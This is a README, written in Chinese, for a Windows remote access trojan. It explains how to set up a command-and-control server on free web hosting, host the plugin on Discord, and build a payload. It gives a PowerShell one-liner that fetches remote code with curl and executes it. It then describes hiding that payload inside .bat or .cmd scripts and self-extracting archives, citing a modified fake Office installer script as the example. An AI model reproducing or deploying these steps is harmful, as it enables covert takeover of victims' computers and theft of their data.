# RAT
## 軟體限制
* 只可用於windows10/11

## 環境建構
### 需要的軟體或服務
* python>=3.10
* 000webhost帳號

### 搭建c2和設定c2網址
1. 到000webhost的file manager將c2_server的所有檔案放入public_html，並複製你的網站網址，它會長得像`https://<your domain >.000webhostspp.com`。
2. 到host/server.py 將所有的`<YOUR 000webhost URL>`改成你的網站網址。
3. 到Plugin/client.pyw 將所有的`<YOUR 000webhost URL>`改成你的網站網址。
4. 在這個git的目錄底下用cmd執行`pip -r requirements.txt`

## 建構payload
1. 將修改好的Plugin資料夾壓縮成Plugin.zip並上傳至discord。
2. 複製上傳到discord的Plugin.zip的檔案連結
3. 將shell_content.txt中的`<YOUR Plugin.zip URL>`改成discord的Plugin.zip的檔案連結
4. 將shell_content.txt上傳到discord並複製檔案連結
5. 將payload中的`YOUR INSTALL URL`改成shell_content.txt的檔案連結

### payload
```powershell
powershell -Command "$a = & curl.exe -k 'YOUR INSTALL URL'; powershell -Command $a"
```

以上就是建構payload的方法
## payload的使用方法
1. 放入.bat、.cmd 腳本
2. 利用自解檔在執行時加入payload設定為解壓縮前或後執行
3. 可以將其加入各式腳本中

### 使用範例
![請見office2021.bat](https://github.com/jashing223/RAT/blob/try/Office2021.bat)
以上檔案截自網路並做過修改原先功能已無法使用，這個檔案僅作為使用範例。

## 運作流程
![diagram-export-2024-5-11-下午8_36_26](https://github.com/jashing223/RAT/assets/78540692/42413190-d754-4abd-a4f9-02d2a6c30a19)
